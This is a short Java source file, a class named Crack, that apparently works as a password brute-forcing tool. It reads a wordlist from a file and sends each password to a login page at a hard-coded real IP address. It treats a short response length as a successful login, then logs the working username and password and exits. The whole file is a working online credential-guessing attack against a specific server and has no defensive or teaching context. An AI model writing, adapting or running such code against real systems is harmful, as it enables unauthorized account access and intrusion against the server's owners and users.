package yzgjj;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.log4j.Logger;
public class Crack {
	
	public static final Integer MAX_CONTENT_LENGTH=400;
	
	Logger log = Logger.getLogger("crack");
	
	public List<String> getPasswords(String path) throws IOException{
		List<String> passwords= new ArrayList<String>();
		BufferedReader  reader = new BufferedReader(new FileReader(path));
        String password=null;
        while ((password = reader.readLine()) != null) {
        	passwords.add(password);
        }
        reader.close();
        return passwords;
	       
	}
	
	public void doCrack(List<String> passwords,String id) throws Exception{
		 for (String password :passwords) {
			 	send(id,password);
			  }
	}
	public void send(String id,String password) throws ClientProtocolException, IOException{
		CloseableHttpClient httpclient = HttpClients.createDefault();  
    	HttpGet httpget = new HttpGet("http://58.220.193.178:8880/yw/login.asp?username="+id+"&password="+password);  
        CloseableHttpResponse response = httpclient.execute(httpget);  
        String headerlength=response.getFirstHeader("Content-Length").getValue();
        Double length=Double.parseDouble(headerlength);
        if(length<MAX_CONTENT_LENGTH){
        	successNotify(id,password);
        }
        log.info("try --"+id+","+password+",and result-"+length);
        
	}
	
	public void successNotify(String id,String password){
		log.info("¹§Ï²Äã³É¹¦ÁË"+id+","+password);
		System.exit(1);
	}
}
